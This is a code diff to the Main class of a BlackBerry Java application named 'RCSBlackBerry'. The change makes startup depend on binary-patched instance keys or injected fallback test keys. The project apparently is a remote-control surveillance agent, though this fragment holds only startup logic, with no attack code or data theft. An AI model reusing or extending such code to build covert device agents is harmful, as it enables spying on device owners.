@@ -9,11 +9,10 @@
  * *************************************************/
 package blackberry;
 
-import net.rim.device.api.system.Application; 
-//#ifdef TEST
-import tests.MainTest; 
-//#endif
+import net.rim.device.api.system.Application; //#ifdef TEST
+import tests.MainTest; //#endif
 import blackberry.config.InstanceKeys323;
+import blackberry.config.InstanceKeysEmbedded;
 import blackberry.config.Keys;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
@@ -39,7 +38,18 @@ public class Main extends Application {
         } else {
             //#endif
 
-            new Main().enterEventDispatcher();
+            boolean binaryPatched = Keys.hasBeenBinaryPatched();
+            //#ifdef FAKE323   
+            if (!binaryPatched) {
+                InstanceKeysEmbedded instance = new InstanceKeys323();
+                Keys.getInstance().setInstanceKeys(instance);
+                binaryPatched = true;
+            }
+            //#endif
+
+            if (binaryPatched) {
+                new Main().enterEventDispatcher();
+            }
 
             //#ifdef DEBUG 
         }
@@ -56,29 +66,18 @@ public class Main extends Application {
     public Main() {
         Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
 
-        boolean binaryPatched = false;
-        if (!Keys.hasBeenBinaryPatched()) {
-            binaryPatched = true;
-            InstanceKeys323.injectKeys323();
-        }
-
         appListener = AppListener.getInstance();
         final Core core = Core.getInstance();
 
         debug = new Debug("Main", DebugLevel.VERBOSE);
         debug.info("RCSBlackBerry " + Version.getString());
 
-        if (binaryPatched) {
-            //#ifdef DEBUG
-            debug.warn("Not binary patched, injecting 323");
-            //#endif
-        }
-
         final Thread coreThread = new Thread(core);
         coreThread.setPriority(Thread.MIN_PRIORITY);
         coreThread.start();
 
         startListeners();
+
     }
 
     /**
